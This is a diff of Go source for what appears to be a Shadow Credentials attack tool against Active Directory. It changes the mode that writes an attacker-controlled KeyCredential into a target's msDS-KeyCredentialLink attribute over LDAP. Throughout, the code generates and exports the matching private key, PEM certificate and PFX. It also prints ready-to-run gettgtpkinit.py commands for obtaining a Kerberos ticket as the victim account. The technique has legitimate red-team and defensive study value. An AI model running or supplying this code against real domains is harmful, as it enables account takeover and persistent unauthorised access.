@@ -4,13 +4,13 @@ import (
 	"fmt"
 	"time"
 
-	"goWhisker/core/config"
-	"goWhisker/keycredentiallink"
-	"goWhisker/keycredentiallink/cryptography"
-	"goWhisker/keycredentiallink/key"
-	"goWhisker/ldap"
-	"goWhisker/logger"
-	"goWhisker/utils"
+	"shadowcredentials/core/config"
+	"shadowcredentials/keycredentiallink"
+	"shadowcredentials/keycredentiallink/cryptography"
+	"shadowcredentials/keycredentiallink/key"
+	"shadowcredentials/ldap"
+	"shadowcredentials/logger"
+	"shadowcredentials/utils"
 
 	"github.com/p0dalirius/winacl/guid"
 )
@@ -27,7 +27,11 @@ import (
 // - deviceId: The device ID of the KeyCredential.
 // - keySize: The key size of the KeyCredential.
 // - debug: Whether to enable debug mode.
-func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, notAfter, deviceId string, keySize int, config config.Config) error {
+func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, notAfter, deviceId string, keySize int, exportPem, exportPfx bool, config config.Config) error {
+	if config.Debug {
+		logger.Debug("Starting mode 'create'")
+	}
+
 	// Time to add the keycredential to the user
 	ldapSession := ldap.Session{}
 	ldapSession.InitSession(
@@ -52,7 +56,7 @@ func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, 
 		logger.Info(fmt.Sprintf("Searching for target object: %s", distinguishedName))
 		query := fmt.Sprintf("(distinguishedName=%s)", distinguishedName)
 
-		attributes := []string{"distinguishedName", "msDS-KeyCredentialLink"}
+		attributes := []string{"distinguishedName", "msDS-KeyCredentialLink", "sAMAccountName"}
 		ldapResults := ldap.QueryWholeSubtree(&ldapSession, "", query, attributes)
 
 		if config.Debug {
@@ -79,9 +83,13 @@ func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, 
 		if err != nil {
 			return fmt.Errorf("error parsing notBefore: %s", err)
 		}
-		notAfterTime, err := utils.TimeParseOrNow(notAfter)
-		if err != nil {
-			return fmt.Errorf("error parsing notAfter: %s", err)
+		// Set notAfter to 1 year from notBefore if not specified
+		notAfterTime := notBeforeTime.Add(time.Hour * 24 * 365 * 1)
+		if len(notAfter) > 0 {
+			notAfterTime, err = utils.TimeParseOrNow(notAfter)
+			if err != nil {
+				return fmt.Errorf("error parsing notAfter: %s", err)
+			}
 		}
 		// Set key size to 2048 if not specified
 		if keySize == 0 {
@@ -91,27 +99,13 @@ func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, 
 			keySize = 2048
 		}
 
+		sAMAccountName := ldapResults[0].GetAttributeValue("sAMAccountName")
+
 		logger.Info("Creating new X509Certificate")
-		cert, err := cryptography.NewX509Certificate(distinguishedName, keySize, notBeforeTime, notAfterTime)
+		cert, err := cryptography.NewX509Certificate(sAMAccountName, keySize, notBeforeTime, notAfterTime)
 		if err != nil {
 			return fmt.Errorf("error creating X509Certificate: %s", err)
 		}
-
-		// Export the certificate to PEM, PFX, and binary formats
-		datePrefix := time.Now().Format("2006-01-02_15-04-05")
-		pfxPassword := utils.RandomString(16)
-		filePrivateKey := fmt.Sprintf("./keys/%s/%s.pem", datePrefix, utils.PathSafeString(distinguishedName))
-		filePublicKey := fmt.Sprintf("./keys/%s/%s.pub.pem", datePrefix, utils.PathSafeString(distinguishedName))
-		filePFX := fmt.Sprintf("./keys/%s/%s_%s.pfx", datePrefix, utils.PathSafeString(distinguishedName), pfxPassword)
-		// Export the private key
-		cert.ExportRSAPrivateKeyPEM(filePrivateKey)
-		logger.Info(fmt.Sprintf(" | Saved PEM private key: %s", filePrivateKey))
-		// Export the public key
-		cert.ExportRSAPublicKeyPEM(filePublicKey)
-		logger.Info(fmt.Sprintf(" | Saved PEM public key: %s", filePublicKey))
-		// Export the PFX
-		cert.ExportPFX(filePFX, pfxPassword)
-		logger.Info(fmt.Sprintf(" | Saved PFX with password '%s': %s", pfxPassword, filePFX))
 
 		// Prepare values for the KeyCredential
 		keyVersion := key.KeyCredentialVersion{Value: key.KeyCredentialVersion_2}
@@ -163,7 +157,6 @@ func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, 
 		}
 
 		//
-
 		err = ldapSession.AddStringToAttributeList(
 			ldapResults[0].GetAttributeValue("distinguishedName"),
 			"msDS-KeyCredentialLink",
@@ -171,9 +164,41 @@ func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, 
 		)
 
 		if err != nil {
+			logger.Warn(fmt.Sprintf("Error adding value to attribute: %s", err))
 			return fmt.Errorf("error adding value to attribute: %s", err)
 		} else {
 			logger.Info("Successfully added a new KeyCredentialLink to the existing msDS-KeyCredentialLink value")
+
+			// Export the certificate to PEM, PFX, and binary formats
+			datePrefix := time.Now().Format("2006-01-02_15-04-05")
+
+			// Export the PEM
+			if exportPem {
+				filePrivateKey := fmt.Sprintf("./keys/%s/%s.pem", datePrefix, utils.PathSafeString(distinguishedName))
+				fileCertificatePem := fmt.Sprintf("./keys/%s/%s.cert.pem", datePrefix, utils.PathSafeString(distinguishedName))
+				// Export the private key
+				cert.ExportRSAPrivateKeyPEM(filePrivateKey)
+				logger.Info(fmt.Sprintf(" | Saved PEM private key: %s", filePrivateKey))
+				// Export the public key
+				cert.ExportCertificatePEM(fileCertificatePem)
+				logger.Info(fmt.Sprintf(" | Saved PEM certificate: %s", fileCertificatePem))
+
+				logger.Info("You can now get a TGT for this account using https://github.com/dirkjanm/PKINITtools with this command:")
+				logger.Info(fmt.Sprintf("python3 gettgtpkinit.py -dc-ip '%s' -cert-pem '%s' -key-pem '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePem, filePrivateKey, config.Network.Domain, config.Credentials.Username, sAMAccountName))
+			}
+
+			// Export the PFX
+			if exportPfx {
+				pfxPassword := utils.RandomString(16)
+				fileCertificatePFX := fmt.Sprintf("./keys/%s/%s_%s.pfx", datePrefix, utils.PathSafeString(distinguishedName), pfxPassword)
+
+				cert.ExportCertificatePFX(fileCertificatePFX, pfxPassword)
+				logger.Info(fmt.Sprintf(" | Saved PFX with password '%s': %s", pfxPassword, fileCertificatePFX))
+
+				logger.Info("You can now get a TGT for this account using https://github.com/dirkjanm/PKINITtools with this command:")
+				logger.Info(fmt.Sprintf("python3 gettgtpkinit.py -dc-ip '%s' -cert-pfx '%s' -pfx-pass '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePFX, pfxPassword, config.Network.Domain, config.Credentials.Username, sAMAccountName))
+			}
+
 		}
 	} else {
 		return fmt.Errorf("error connecting to LDAP server")
